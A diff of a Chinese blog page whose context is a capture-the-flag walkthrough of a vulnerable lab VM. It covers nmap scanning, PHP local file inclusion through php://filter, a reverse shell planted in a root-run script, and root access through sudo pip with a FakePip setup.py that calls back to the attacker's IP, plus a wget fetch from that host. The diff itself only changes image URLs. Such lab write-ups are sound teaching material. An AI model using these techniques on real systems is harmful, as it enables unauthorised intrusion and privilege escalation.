@@ -224,20 +224,20 @@
 <h2 id="0x00-渗透过程"><a href="#0x00-渗透过程" class="headerlink" title="0x00 渗透过程"></a>0x00 渗透过程</h2><h3 id="1-对靶机的信息收集"><a href="#1-对靶机的信息收集" class="headerlink" title="1.对靶机的信息收集"></a>1.对靶机的信息收集</h3><p>攻击机：</p>
 <pre><code>自用kali--IP地址:192.168.1.107
 </code></pre><p>kali netdiscover 启动:</p>
-<p><img src="images\netdiscover.png" alt=""></p>
+<p><img src="https://i.loli.net/2018/10/06/5bb89ebe12b5d.png" alt=""></p>
 <p>​    那么可以得到靶机 IP ：192.168.1.108 ，既然得到了靶机ip地址，那么拿出nmap神器对其进行一波扫描，获得更详细的靶机信息。</p>
 <pre class=" language-bash"><code class="language-bash">nmap -sV 192.168.1.108
 </code></pre>
-<p><img src="images\nmap.png" alt=""></p>
+<p><img src="https://i.loli.net/2018/10/06/5bb89ecba4d21.png" alt=""></p>
 <p>​    由nmap扫描得出的信息，开启了80端口的web服务，然后是3333端口的一个Openssh服务，这里需要做一下笔记，ssh连接是3333端口而不是常规的22端口哦！先去80端口访问一下看看情况：</p>
-<p><img src="images\homepage.png" alt=""></p>
+<p><img src="https://i.loli.net/2018/10/06/5bb89ed45deb8.png" alt=""></p>
 <p>​    emmm,发现就一个普通页面啥也没有，只有一个看似有用的 Made by@mamadou ???难道是个用户名还是个密码啥的？先做笔记记一下，萌新就是什么都要做笔记，接下来扫一下目录看看:</p>
-<p><img src="images\dirb.png" alt=""></p>
+<p><img src="https://i.loli.net/2018/10/06/5bb89edbcd18b.png" alt=""></p>
 <p>​    扫到几个页面，但是貌似SIZE都是0，被CTF各种虐的我还是选择去看看页面里有没有东西。==&gt;转了一圈发现确实是空的，那咋办，难道渗透之旅到此结束？仔细想了几分钟，既然只有一个页面，忘记看源码了，源码如下:</p>
-<p><img src="images\getinto.png" alt=""></p>
+<p><img src="https://i.loli.net/2018/10/06/5bb89ee81c834.png" alt=""></p>
 <p>​    这绿的我发慌的一串注释，不用直觉我猜也是靶机的切入点了，lang参数改变会影响页面的语言显示，猜测可能是 lang参数改变了使用的语言php文件，那么就是和文件相关的漏洞咯！</p>
 <p>​    但是只有这一个页面，应该可以检测一下这个参数是否可以进行本地文件包含(Local File Include)，将这唯一的一个页面的完整源码给读下来。利用之前做ctf还算有一点点的经验（参考<a href="https://blog.csdn.net/qq_35544379/article/details/78230629），我们可以用" target="_blank" rel="noopener">https://blog.csdn.net/qq_35544379/article/details/78230629），我们可以用</a> php://filter 这个协议的一些小特性来将源码以base64的形式down下来:</p>
-<p><img src="images\sourcecode.png" alt=""></p>
+<p><img src="https://i.loli.net/2018/10/06/5bb89ef3e3358.png" alt=""></p>
 <p>​    然后base64解码得到如下完整的源码：</p>
 <pre><code>&lt;?php
 $password =&quot;Niamey4Ever227!!!&quot; ;//I have to remember it
@@ -306,13 +306,13 @@ include($_GET[&#39;lang&#39;].&quot;.php&quot;);
 <span class="token operator">>></span><span class="token operator">></span>spawn<span class="token punctuation">(</span><span class="token string">"/bin/bash"</span><span class="token punctuation">)</span>
 mamadou@Wakanda1<span class="token punctuation">:</span><span class="token operator">~</span>$ 
 </code></pre>
-<p><img src="images\terminalshell.png" alt=""></p>
+<p><img src="https://i.loli.net/2018/10/06/5bb89f067fc33.png" alt=""></p>
 <p>​    问题不大，ls看一下目录，看到了我们要找的第一个flag,也就是flag1.txt，然后cat flag1.txt ==&gt; Flag : d86b9ad71ca887f4dd1dac86ba1c4dfc</p>
 <p>​    接下来就是找一下flag2.txt了，到上级目录看到了另外一个用户 devops 的目录，进去看看找到了flag2.txt，但是没有权限，需要以devops的身份打开。</p>
-<p><img src="images\flag2.txt.png" alt=""></p>
+<p><img src="https://i.loli.net/2018/10/06/5bb89f0ef1687.png" alt=""></p>
 <p>​    去别的目录逛一逛，果然/tmp目录下是有点东西的，但是只是一个test文件，里面含有一个‘test’字符串，并没有什么不同。</p>
 <p>​    看看跟devops有关系的文件有哪些:</p>
-<p><img src="images\antiviruspy.png" alt=""></p>
+<p><img src="https://i.loli.net/2018/10/06/5bb89f16aa291.png" alt=""></p>
 <p>​    第一个还是仅有的一个就是一个python脚本的样子（忽略后面的setup.py，因为是做完之后写的文章，setup.py是后面我弄进去的文件），看看.antivirus.py内容是啥:</p>
 <pre class=" language-python"><code class="language-python">open<span class="token punctuation">(</span><span class="token string">'/tmp/test'</span><span class="token punctuation">,</span><span class="token string">'w'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token string">'test'</span><span class="token punctuation">)</span>
 </code></pre>
@@ -344,12 +344,12 @@ ExecStart=/usr/bin/env python /srv/.antivirus.py
 WantedBy=multi-user.target
 #可以看到是每300秒执行一次
 </code></pre><p>​    那么接下来，写入的shell原封不动，kali攻击机nc监听7777端口，等待.antivirus.py自动运行(一分一秒地等待总是漫长的）。</p>
-<p><img src="images\devopsshell.png" alt=""></p>
+<p><img src="https://i.loli.net/2018/10/06/5bb89f341619f.png" alt=""></p>
 <p>​    果不其然，获得了反弹devops权限的shell，那么cat flag2.txt ==&gt;Flag 2 : d8ce56398c88e1b4d9e5f83e64c79098</p>
 <p>​    那么下一步就是拿下root权限，攻入root目录了。</p>
 <hr>
 <h3 id="3-攻破root"><a href="#3-攻破root" class="headerlink" title="3.攻破root"></a>3.攻破root</h3><p>​    先看看devops用户权限大概是怎样的, 执行sudo -l命令：</p>
-<p><img src="images\sudodevops.png" alt=""></p>
+<p><img src="https://i.loli.net/2018/10/06/5bb89f44d2154.png" alt=""></p>
 <p>​    然而，只有一个pip命令是可以不需要root权限就能执行的，试试pip install falsk，没问题。</p>
 <p>​    那么怎样才能通过pip来获取root权限呢？这里用到一个github上的开源脚本Fakepip。这个脚本通过在pip重新安装时执行的setup.py文件中插入shellcode，导致其可通过pip反弹root权限的shell给攻击机。项目地址(<a href="https://github.com/0x00-0x00/FakePip.git" target="_blank" rel="noopener">https://github.com/0x00-0x00/FakePip.git</a>)</p>
 <p>​    接下来在攻击机上把Fakepip给git下来,然后进入Fakepip目录,将setup.py中的RHOST参数改为攻击机地址:192.168.1.107,然后启动python的简易服务器。</p>
@@ -379,14 +379,14 @@ setup(name=&#39;FakePip&#39;,
       zip_safe=False,
       cmdclass={&#39;install&#39;: CustomInstall})
 
-</code></pre><p><img src="images\http.png" alt=""></p>
+</code></pre><p><img src="https://i.loli.net/2018/10/06/5bb89f5460351.png" alt=""></p>
 <p>​    然后在devops靶机上用<code>wget http://192.168.1.107/setup.py</code> 将攻击机上的setup.py下载到本地，攻击机kali开始用nc监听443端口，准备接收即将到来的shell。</p>
 <p>​    在devops靶机上命令pip重装：<code>sudo pip install ./ --upgrade --force-install</code></p>
-<p><img src="images\runsetup.png" alt=""></p>
+<p><img src="https://i.loli.net/2018/10/06/5bb89f60ece0f.png" alt=""></p>
 <p>​    kali兴奋地一把接到反弹过来的shell：</p>
-<p><img src="images\root.png" alt=""></p>
+<p><img src="https://i.loli.net/2018/10/06/5bb89f65ea5ee.png" alt=""></p>
 <p><code>cd root</code> ,然后<code>cat root.txt</code>:</p>
-<p><img src="images\final.png" alt=""></p>
+<p><img src="https://i.loli.net/2018/10/06/5bb89f7108f3e.png" alt=""></p>
 <p>​    萌新的渗透到此暂停emmmm。</p>
 <hr>
 <h2 id="0x01-小知识"><a href="#0x01-小知识" class="headerlink" title="0x01 小知识"></a>0x01 小知识</h2><hr>
@@ -405,7 +405,7 @@ setup(name=&#39;FakePip&#39;,
 <h3 id="php-filter-and-input-–LFI本地文件包含漏洞"><a href="#php-filter-and-input-–LFI本地文件包含漏洞" class="headerlink" title="php filter and input –LFI本地文件包含漏洞"></a>php filter and input –LFI本地文件包含漏洞</h3><p>参考 <a href="https://blog.csdn.net/qq_35544379/article/details/78230629" target="_blank" rel="noopener">https://blog.csdn.net/qq_35544379/article/details/78230629</a></p>
 <p>php://filter,php://input,php://output都是有妙用的哦！</p>
 <hr>
-<h3 id="msfvenom-p-生成shell"><a href="#msfvenom-p-生成shell" class="headerlink" title="msfvenom -p   生成shell"></a>msfvenom -p   生成shell</h3><p><img src="images\msf.png" alt=""></p>
+<h3 id="msfvenom-p-生成shell"><a href="#msfvenom-p-生成shell" class="headerlink" title="msfvenom -p   生成shell"></a>msfvenom -p   生成shell</h3><p><img src="https://i.loli.net/2018/10/06/5bb89f84ea8cc.png" alt=""></p>
 <p>​    但在渗透过程中发现，不用msfvenom生成的加密shell也能成功反弹，不过还是要养成好习惯，多用用这种神器提高效率并且准确率。</p>
 <p>参考链接 <a href="https://www.cnblogs.com/xishaonian/p/6851475.html" target="_blank" rel="noopener">https://www.cnblogs.com/xishaonian/p/6851475.html</a></p>
 <hr>
